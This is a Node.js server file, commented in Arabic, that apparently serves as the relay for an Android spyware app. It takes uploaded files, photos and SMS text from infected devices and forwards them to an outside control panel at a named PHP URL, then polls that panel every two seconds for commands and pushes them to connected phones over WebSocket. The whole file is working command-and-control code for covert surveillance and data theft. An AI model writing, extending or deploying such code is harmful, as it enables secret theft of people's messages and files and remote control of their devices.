const express = require('express');
const webSocket = require('ws');
const http = require('http');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const FormData = require('form-data');

const PANEL_URL = 'https://wahm.pro/bot/control.php'; 

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });

// إعدادات multer لاستقبال الملفات الكبيرة
const upload = multer({ storage: multer.memoryStorage() });

app.use(bodyParser.json({limit: '50mb'}));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// استقبال الصور/الملفات من الـ APK وإرسالها للـ PHP
app.post("/uploadFile", upload.single('file'), async (req, res) => {
    try {
        const model = req.headers.model || "Unknown Device";
        if (req.file) {
            const form = new FormData();
            form.append('file', req.file.buffer, { filename: req.file.originalname });
            form.append('model', model);
            
            await axios.post(PANEL_URL, form, {
                headers: { ...form.getHeaders() }
            });
        }
        res.send('OK');
    } catch (e) {
        res.status(500).send('Error');
    }
});

// استقبال النصوص والرسائل SMS من الـ APK وإرسالها للـ PHP
app.post("/uploadText", async (req, res) => {
    try {
        const model = req.headers.model || "Unknown Device";
        const textContent = req.body['text'];
        
        const params = new URLSearchParams();
        params.append('model', model);
        params.append('text', textContent);
        
        await axios.post(PANEL_URL, params, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });
        res.send('OK');
    } catch (e) {
        res.status(500).send('Error');
    }
});

app.get('/', (req, res) => res.send('WAHM SERVER RUNNING 🚀'));

// إدارة الـ WebSocket للأوامر
appSocket.on('connection', (ws, req) => {
    const model = req.headers.model || "Unknown";
    console.log(`Connected: ${model}`);
    
    ws.on('message', async (msg) => {
        // في حال أرسل التطبيق رد نصي مباشر عبر السوكيت
        const params = new URLSearchParams();
        params.append('model', model);
        params.append('text', msg.toString());
        await axios.post(PANEL_URL, params);
    });
});

// سحب الأوامر من اللوحة
setInterval(async () => {
    try {
        const res = await axios.get(`${PANEL_URL}?get_cmd=1`);
        if (res.data && res.data !== "OK") {
            appSocket.clients.forEach(client => {
                if (client.readyState === webSocket.OPEN) client.send(res.data);
            });
        }
    } catch (e) {}
}, 2000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => console.log(`Active on ${PORT}`));

